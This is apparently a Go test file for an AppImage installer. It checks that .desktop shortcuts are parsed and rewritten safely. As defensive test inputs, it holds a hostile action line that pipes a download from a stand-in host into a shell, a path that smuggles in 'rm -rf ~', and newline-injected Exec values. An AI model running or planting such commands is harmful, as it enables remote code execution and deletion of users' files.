package instala

import (
	"strings"
	"testing"
)

const atalhoDeDentro = `# comentário
[Desktop Entry]
Type=Application
Name=Krita
Name[pt_BR]=Krita, pintura
GenericName=Digital Painting
Comment=Pintura digital
Comment[pt_BR]=Pintura
Exec=krita --nosplash %F
TryExec=/bin/sh
Icon=krita
Categories=Qt;KDE;Graphics;
MimeType=image/png;
Terminal=false
StartupWMClass=krita
Path=/tmp
DBusActivatable=true
X-Qualquer=coisa
Actions=Novo;
Categories[pt_BR]=NãoTraduz

[Desktop Action Novo]
Name=Novo
Exec=sh -c "curl evil | sh"
`

func TestLeDesktopSoOGrupoPrincipal(t *testing.T) {
	d := leDesktop([]byte(atalhoDeDentro))
	if d["Name"] != "Krita" || d["Name[pt_BR]"] != "Krita, pintura" || d["Exec"] != "krita --nosplash %F" {
		t.Errorf("veio %v", d)
	}
	// O Exec do [Desktop Action] não entra no lugar do principal.
	if strings.Contains(d["Exec"], "curl") {
		t.Error("leu o Exec de outro grupo")
	}
	if len(leDesktop([]byte("Name=fora de grupo\n[Outro]\nName=x\n"))) != 0 {
		t.Error("chave fora do [Desktop Entry] não vale")
	}
	sujo := leDesktop([]byte("[Desktop Entry]\r\nName=a\tb\x1b[31m\r\nNome invalido!=x\n=y\nName=repetida\n"))
	if sujo["Name"] != "ab[31m" || len(sujo) != 1 {
		t.Errorf("valor com controle ou chave torta: %q", sujo)
	}
}

func TestFazAtalhoSoPassaOQueDescreveEOExecEONosso(t *testing.T) {
	b, err := fazAtalho(atalhoNovo{ID: "krita", Nome: "krita", Executavel: "/home/ana/Aplicativos/krita.AppImage",
		Icone: "/home/ana/Aplicativos/.icones/krita.png", Original: leDesktop([]byte(atalhoDeDentro))})
	if err != nil {
		t.Fatal(err)
	}
	quer := `[Desktop Entry]
Type=Application
Name=Krita
Categories=Qt;KDE;Graphics;
Comment=Pintura digital
Comment[pt_BR]=Pintura
GenericName=Digital Painting
MimeType=image/png;
Name[pt_BR]=Krita, pintura
StartupWMClass=krita
Terminal=false
Exec="/home/ana/Aplicativos/krita.AppImage" --nosplash %F
TryExec=/home/ana/Aplicativos/krita.AppImage
Icon=/home/ana/Aplicativos/.icones/krita.png
X-MkInstalar=krita
`
	if string(b) != quer {
		t.Errorf("veio:\n%s\nqueria:\n%s", b, quer)
	}
	for _, proibido := range []string{"Path=", "DBusActivatable", "Actions", "Desktop Action", "curl", "X-Qualquer", "/bin/sh", "Categories[pt_BR]"} {
		if strings.Contains(string(b), proibido) {
			t.Errorf("não devia passar: %q", proibido)
		}
	}
}

func TestFazAtalhoSemOriginalEMinimo(t *testing.T) {
	b, err := fazAtalho(atalhoNovo{ID: "meu-app", Nome: "Meu App", Executavel: "/h/Aplicativos/meu-app.AppImage"})
	if err != nil {
		t.Fatal(err)
	}
	quer := "[Desktop Entry]\nType=Application\nName=Meu App\nExec=\"/h/Aplicativos/meu-app.AppImage\"\n" +
		"TryExec=/h/Aplicativos/meu-app.AppImage\nIcon=application-x-executable\nX-MkInstalar=meu-app\n"
	if string(b) != quer {
		t.Errorf("veio:\n%s", b)
	}
}

func TestCitaExecEscapaOQueOMenuInterpretaria(t *testing.T) {
	casos := map[string]string{
		"/home/ana/Aplicativos/a.AppImage": `"/home/ana/Aplicativos/a.AppImage"`,
		"/home/ana maria/Apps/a b":         `"/home/ana maria/Apps/a b"`,
		`/h/a"b`:                           `"/h/a\\"b"`,
		"/h/$(rm -rf ~)/`x`":               "\"/h/\\\\$(rm -rf ~)/\\\\`x\\\\`\"",
		`/h/a\b`:                           `"/h/a\\\\b"`,
		"/h/100%/a":                        `"/h/100%%/a"`,
		"/h/ação":                          `"/h/ação"`,
	}
	for entrada, quer := range casos {
		got, err := citaExec(entrada)
		if err != nil || got != quer {
			t.Errorf("citaExec(%q) = %q (%v), queria %q", entrada, got, err, quer)
		}
	}
	if _, err := citaExec("/h/a\nExec=evil"); err == nil {
		t.Error("quebra de linha no caminho devia ser erro")
	}
	if _, err := fazAtalho(atalhoNovo{ID: "a", Executavel: "/h/a", Icone: "x\nExec=evil"}); err == nil {
		t.Error("quebra de linha no ícone devia ser erro")
	}
}

func TestArgumentosDoExec(t *testing.T) {
	casos := map[string]string{
		"krita %U":                     "%U",
		"krita":                        "",
		"  AppRun   --no-sandbox %U  ": "--no-sandbox %U",
		`"/opt/meu app/run" --x %f`:    "--x %f",
		`"/opt/a\"b" %f`:               "%f",
		`"sem fim`:                     "",
		"":                             "",
	}
	for entrada, quer := range casos {
		if got := argumentosDoExec(entrada); got != quer {
			t.Errorf("argumentosDoExec(%q) = %q, queria %q", entrada, got, quer)
		}
	}
}
